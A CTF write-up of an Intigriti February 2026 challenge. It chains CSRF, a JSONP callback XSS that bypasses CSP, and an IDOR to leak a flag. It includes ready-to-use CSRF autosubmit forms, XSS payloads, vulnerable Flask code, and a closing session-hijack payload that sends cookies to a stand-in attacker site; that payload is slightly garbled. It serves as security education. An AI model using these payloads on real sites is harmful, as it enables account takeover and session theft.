# Intigriti CTF February 2026

- **Source URL:** https://medium.com/@safehacker_2715/intigriti-ctf-february-2026-csrf-xss-idor-chain-9850654bd6b9?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@safehacker_2715
- **Fetched:** 2026-11-16
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 12745)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Challenge: Multi-Stage Attack Chain Leading to Flag Disclosure

Author: safehacker\_2715

Solved: February 17, 2026

### Summary

A sophisticated attack chain exploits CSRF on post creation → CSP-bypassing XSS via JSONP endpoint → IDOR on render API to achieve arbitrary authenticated actions and flag disclosure. The vulnerability chain enables full account takeover for any authenticated victim.

### Technical Analysis

Vulnerability Chain Overview

Victim visits attacker's page → CSRF creates malicious post 

↓

Post renders with \<script src="/api/jsonp?callback=evil">

↓

JSONP returns application/javascript with reflected payload

↓

CSP satisfied ('self') → XSS executes → IDOR fetches flag

#### Steps to Reproduce

**Phase 1: CSRF Post Creation**

1. Authenticate at [https://challenge-0226.intigriti.io/dashboard](https://challenge-0226.intigriti.io/dashboard)
2. Save and open this HTML file in the same browser:

\<html>

\<body>

\<form id="autosubmit" method="POST" action="https://challenge-0226.intigriti.io/post/new">

\<input type="hidden" name="title" value="XSS">

\<input type="hidden" name="content" value='XSS'>\<script>'>

\</form>

\<script>document.getElementById("autosubmit").submit();\</script>

\</body>

\</html>

Result: Unauthorized post created under victim’s account

**Phase 2: CSP Bypass via JSONP**

The post content is updated to inject:

\<script src="https://challenge-0226.intigriti.io/api/jsonp?callback=alert(document.domain);//">

Critical Insight: /api/jsonp reflects callback parameter in application/javascript MIME type:

// Server response:

alert(document.domain);//\[remaining JSON\]

### Phase 3: IDOR Flag Disclosure

IDOR discovered via ID enumeration on /api/render?id=. Flag located at ID 1172 (at that point it time, challenge may frequently reset this).

Flag-extracting payload:

\<html>

\<body>

\<form id="autosubmit" method="POST" action="/post/new">

\<input type="hidden" name="title" value="XSS">

\<input type="hidden" name="content" value='XSS\<script src="https://challenge-0226.intigriti.io/api/jsonp?callback=fetch(%27/api/render?id=1172%27).then(function(r){return r.json()}).then(function(data){ div=document.createElement(%27div%27); div.innerHTML=data.html; alert(div.innerText); });//@">\</script>'>

\</form>

\<script>document.getElementById("autosubmit").submit();\</script>

\</body>

\</html>

### Root Causes

- CSRF (CWE-352) No CSRF tokens on /post/new &POST accepts user-controlled content without authentication checks

```
@app.route('/post/new', methods=['GET', 'POST'])
@login_required
def post_new():
    if request.method == 'POST':
        title = request.form.get('title', '').strip()
        content = request.form.get('content', '').strip()
        
        if not title or not content:
            flash('Title and content required.', 'error')
            return render_template('post_new.html')
        
        post = Post(
            title=title,
            content=content,
            author_id=session['user_id']
        )
        db.session.add(post)
        db.session.commit()
        
        flash('Post created!', 'success')
        return redirect(url_for('post_view', post_id=post.id))
    
    return render_template('post_new.html')
```
- Reflection in JSONP (CWE-79)

```
@app.route('/api/jsonp')
def api_jsonp():
    callback = request.args.get('callback', 'handleData')
    
    if '<' in callback or '>' in callback:
        callback = 'handleData'
    
    user_data = {
        'authenticated': 'user_id' in session,
        'timestamp': time.time()
    }
    
    if 'user_id' in session:
        user = User.query.get(session['user_id'])
        if user:
            user_data['username'] = user.username
    
    response = f"{callback}({json.dumps(user_data)})"
    return Response(response, mimetype='application/javascript')
```
- IDOR (CWE-200)

### Real-World Impact

1. Account takeover via session theft
2. Arbitrary post creation/deletion as victim
3. Admin panel access if victim has privileges
4. PII extraction from private posts

### Remediation

- CSRF Protection
- JSONP Hardening
- IDOR Fix
- CSP Enhancement
- Content Sanitization

### Key Learnings (as a researcher)

1. JSONP endpoints are XSS landmines without callback validation
2. CSP ≠ security if MIME types bypass policy
3. Post creation + auto-preview = persistent XSS
4. IDOR often hides in API endpoints (enumerate!)

“The preview loads separately… and it remembers things it shouldn’t

### Alternative solution — Session Hijack (not reported)

- Craft a stored XSS payload exploiting a post creation feature on the target platform.
- After registering and logging in, navigate to the post section, set any name, and inject this payload in the content field: \<script src="/api/jsonp?callback=location.href='attacker-site='.document.cookie//>\</script>.
- Publish the post, then moderator review by clicking "*Report to Moderator*"—this executes the script in their high-priv session.
- A classic JSONP callback abuse leading to session hijack
- This session should have access to all the posts including the post with flag
